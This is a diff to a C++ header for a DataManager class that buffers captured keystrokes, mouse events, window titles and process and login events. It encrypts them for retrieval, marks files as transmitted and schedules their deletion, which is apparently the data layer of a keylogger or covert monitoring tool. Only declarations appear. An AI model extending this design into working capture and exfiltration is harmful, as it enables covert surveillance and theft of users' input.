@@ -9,11 +9,58 @@
 #include <vector>
 #include <mutex>
 #include <chrono>   
-    
-struct MouseData;
-struct SystemEventData;
 
+// Forward declarations
 class Configuration;
+
+struct MouseData {
+    uint64_t timestamp;
+    enum class EventType { 
+        MOUSE_MOVE,
+        MOUSE_DOWN,
+        MOUSE_UP,
+        MOUSE_WHEEL,
+        MOUSE_CLICK
+    };
+    EventType eventType;
+    
+    enum class Button {
+        NONE,
+        LEFT,
+        RIGHT,
+        MIDDLE,
+        X1,
+        X2
+    };
+    Button button;
+    
+    struct Position {
+        int x;
+        int y;
+    };
+    Position position;
+    
+    int wheelDelta;
+    std::string windowTitle;
+};
+
+struct SystemEventData {
+    uint64_t timestamp;
+    enum class EventType { 
+        PROCESS_START,
+        PROCESS_END,
+        WINDOW_OPEN,
+        WINDOW_CLOSE,
+        SYSTEM_LOCK,
+        SYSTEM_UNLOCK,
+        USER_LOGIN,
+        USER_LOGOUT
+    };
+    EventType eventType;
+    std::string windowTitle;
+    std::string processName;
+    std::string extraInfo;
+};
 
 class DataManager {
 public:
@@ -22,7 +69,7 @@ public:
     
     void AddKeyData(const KeyData& keyData);
     void AddMouseData(const MouseData& mouseData);
-    void AddSystemData(const utils::SystemInfo& systemInfo);
+    void AddSystemData(const SystemInfo& systemInfo);
     void AddSystemEventData(const SystemEventData& eventData);
     
     std::vector<uint8_t> RetrieveEncryptedData();
@@ -36,8 +83,8 @@ public:
     
 private:
     Configuration* m_config;
-    std::string m_storagePath;  // Changed from std::wstring to std::string for cross-platform
-    std::string m_currentDataFile;  // Changed from std::wstring to std::string
+    std::string m_storagePath;
+    std::string m_currentDataFile;
     size_t m_maxBufferSize;
     
     mutable std::mutex m_dataMutex;
@@ -56,17 +103,17 @@ private:
     void FlushMouseData();
     void FlushSystemData();
     void FlushSystemEvents();
-    void AppendToFile(const std::string& path, const std::string& data);  // Changed parameter type
+    void AppendToFile(const std::string& path, const std::string& data);
     void RotateDataFileIfNeeded();
     void RotateDataFile();
     
-    static std::vector<std::string> GetDataFilesReadyForTransmission() ;  // Changed return type
-    static void MarkFileAsTransmitted(const std::string& filePath);  // Changed parameter type
-    static void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);  // Changed parameter type
+    std::vector<std::string> GetDataFilesReadyForTransmission();
+    void MarkFileAsTransmitted(const std::string& filePath);
+    void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);
     
-    static std::string KeyDataToString(const KeyData& data) ;
-    static std::string MouseDataToString(const MouseData& data) ;
-    static std::string SystemInfoToString(const SystemInfo& info) ;
+    static std::string KeyDataToString(const KeyData& data);
+    static std::string MouseDataToString(const MouseData& data);
+    static std::string SystemInfoToString(const SystemInfo& info);
     std::string SystemEventToString(const SystemEventData& event) const;
     std::string GenerateBatchId() const;
 };
